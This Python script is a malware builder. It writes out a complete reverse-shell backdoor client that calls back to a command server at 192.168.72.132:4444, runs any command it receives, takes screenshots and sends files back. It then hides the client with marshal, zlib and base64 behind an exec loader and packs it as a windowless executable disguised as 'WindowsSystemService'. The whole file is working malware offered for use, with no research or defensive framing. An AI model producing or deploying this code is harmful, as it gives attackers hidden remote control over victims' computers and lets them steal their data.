import os
import sys
import subprocess
import base64
import zlib
import marshal
import random
import string

def generate_random_name(length=8):
    """Generate random variable names for obfuscation"""
    return ''.join(random.choices(string.ascii_letters, k=length))

def create_working_client():
    """Create the working client code"""
    
    client_code = '''import socket
import subprocess
import os
import time
import pyautogui

class BackdoorClient:
    def __init__(self, host="192.168.72.132", port=4444):
        self.host = host
        self.port = port
        self.end_marker = "<END_OF_RESULT>"
        self.file_marker = "<END_OF_FILE>"
    
    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(30)
                self.sock.connect((self.host, self.port))
                self.handle_commands()
            except Exception as e:
                time.sleep(10)
    
    def handle_commands(self):
        while True:
            try:
                data = self.sock.recv(4096).decode('utf-8', errors='ignore').strip()
                if not data:
                    continue
                
                if data.lower() == "exit" or data.lower() == "quit":
                    break
                elif data.lower() == "stop":
                    self.sock.close()
                    return
                elif data.startswith("cd "):
                    self.change_directory(data[3:])
                elif data.lower() == "screenshot":
                    self.take_screenshot()
                elif data.lower() == "getcwd":
                    self.execute_command("cd")
                elif data.startswith("download "):
                    self.download_file(data[9:])
                elif data.lower() == "test":
                    self.send_result("Test successful - client is working!")
                else:
                    self.execute_command(data)
                    
            except socket.timeout:
                continue
            except Exception as e:
                break
    
    def change_directory(self, path):
        try:
            if path.strip() == "":
                path = os.path.expanduser("~")
            
            if os.path.exists(path):
                os.chdir(path)
                current_dir = os.getcwd()
                self.send_result(f"Directory changed to: {current_dir}")
            else:
                self.send_result(f"Error: Directory not found - {path}")
        except Exception as e:
            self.send_result(f"Error changing directory: {e}")
    
    def take_screenshot(self):
        try:
            filename = f"screenshot_{int(time.time())}.png"
            pyautogui.screenshot(filename)
            self.send_result(f"Screenshot saved as: {filename}")
        except Exception as e:
            self.send_result(f"Screenshot error: {e}")
    
    def download_file(self, file_path):
        try:
            if os.path.exists(file_path):
                file_size = os.path.getsize(file_path)
                self.sock.send(f"FILE_START:{file_size}".encode())
                time.sleep(0.5)
                
                with open(file_path, "rb") as f:
                    while True:
                        chunk = f.read(4096)
                        if not chunk:
                            break
                        self.sock.send(chunk)
                
                self.sock.send(self.file_marker.encode())
                self.send_result(f"File sent: {file_path} ({file_size} bytes)")
            else:
                self.send_result(f"Error: File not found - {file_path}")
        except Exception as e:
            self.send_result(f"Download error: {e}")
    
    def execute_command(self, cmd):
        try:
            if os.name == 'nt':
                process = subprocess.Popen(
                    ["powershell", "-Command", cmd],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    shell=True
                )
            else:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    shell=True
                )
            
            try:
                stdout, stderr = process.communicate(timeout=30)
                output = ""
                if stdout:
                    output += stdout.decode('utf-8', errors='ignore')
                if stderr:
                    output += f"\\nERROR: {stderr.decode('utf-8', errors='ignore')}"
                
                if output.strip() == "":
                    output = "Command executed successfully (no output)"
                    
            except subprocess.TimeoutExpired:
                process.kill()
                output = "Error: Command timed out after 30 seconds"
            
            self.send_result(output)
            
        except Exception as e:
            self.send_result(f"Command execution error: {e}")
    
    def send_result(self, result):
        try:
            if not isinstance(result, str):
                result = str(result)
            
            full_result = result + self.end_marker
            self.sock.send(full_result.encode('utf-8'))
        except Exception as e:
            pass

def main():
    client = BackdoorClient()
    client.connect()

if __name__ == "__main__":
    main()
'''
    
    with open("client_original.py", "w") as f:
        f.write(client_code)
    
    print("[+] Client code created: client_original.py")
    return "client_original.py"

def fixed_obfuscation(input_file, output_file):
    """Apply obfuscation with proper variable assignment"""
    print("[+] Applying fixed obfuscation...")
    
    with open(input_file, 'r') as f:
        code = f.read()
    
    bytecode = compile(code, input_file, 'exec')
    marshaled_code = marshal.dumps(bytecode)
    
    compressed_code = zlib.compress(marshaled_code)
    
    encoded_code = base64.b64encode(compressed_code).decode()
    
    var_names = [generate_random_name() for _ in range(5)]
    
    loader = f'''
# Obfuscated Client
import marshal
import zlib 
import base64

# Proper variable assignment
{var_names[0]} = "{encoded_code}"
{var_names[1]} = base64.b64decode({var_names[0]})
{var_names[2]} = zlib.decompress({var_names[1]})
{var_names[3]} = marshal.loads({var_names[2]})
exec({var_names[3]})
'''
    
    with open(output_file, 'w') as f:
        f.write(loader)
    
    print(f"[+] Fixed obfuscation complete: {output_file}")
    return output_file

def compile_fixed_client(script_path):
    """Compile the fixed client"""
    print("[+] Compiling fixed client...")
    
    exe_name = "WindowsSystemService"
    
    try:
        result = subprocess.run([
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            f"--name={exe_name}",
            "--clean",
            "--hidden-import=pyautogui",
            "--hidden-import=socket",
            "--hidden-import=subprocess", 
            "--hidden-import=os",
            "--hidden-import=time",
            script_path
        ], capture_output=True, text=True, timeout=300)
        
        if result.returncode == 0:
            if os.path.exists(f"dist/{exe_name}.exe"):
                size = os.path.getsize(f"dist/{exe_name}.exe") // 1024
                print(f"[✅] SUCCESS: dist/{exe_name}.exe ({size} KB)")
                return True
        else:
            print(f"[-] Compilation failed: {result.stderr}")
            return False
            
    except subprocess.TimeoutExpired:
        if os.path.exists(f"dist/{exe_name}.exe"):
            size = os.path.getsize(f"dist/{exe_name}.exe") // 1024
            print(f"[✅] SUCCESS (after timeout): dist/{exe_name}.exe ({size} KB)")
            return True
        return False
    except Exception as e:
        print(f"[-] Compilation error: {e}")
        return False

def cleanup():
    """Clean up temporary files"""
    files_to_remove = [
        "client_original.py",
        "client_obfuscated.py",
        "build/",
        "__pycache__/", 
        "WindowsSystemService.spec"
    ]
    
    for item in files_to_remove:
        try:
            if os.path.isdir(item):
                import shutil
                shutil.rmtree(item)
            elif os.path.exists(item):
                os.remove(item)
        except:
            pass

def main():
    print("🔒 OBFUSCATION BUILDER")
    print("=" * 50)
    
    try:

        print("\n[1/3] Creating client code...")
        client_file = create_working_client()
        
  
        print("\n[2/3] Applying fixed obfuscation...")
        obfuscated_file = fixed_obfuscation(client_file, "client_obfuscated.py")
        
   
        print("\n[3/3] Compiling fixed client...")
        success = compile_fixed_client(obfuscated_file)
        

        print("\n" + "=" * 50)
        if success:
            print("🎉 FIXED BUILD COMPLETE!")
            print("📁 Obfuscated Backdoor: dist/WindowsSystemService.exe")
            print("⚡ Features:")
            print("   ✅ Bytecode obfuscation")
            print("   ✅ Compression encoding")
            print("   ✅ Base64 payload")
            print("   ✅ Proper variable assignment")
            print("   ✅ No console window")
            print("   ✅ Full command execution")
            print("\n💡 Test with: C2 server on 192.168.72.132:4444")
        else:
            print("❌ Build failed")
            
    except Exception as e:
        print(f"\n💥 Build error: {e}")
    finally:
        print("\n🧹 Cleaning up temporary files...")
        cleanup()

if __name__ == "__main__":
    main()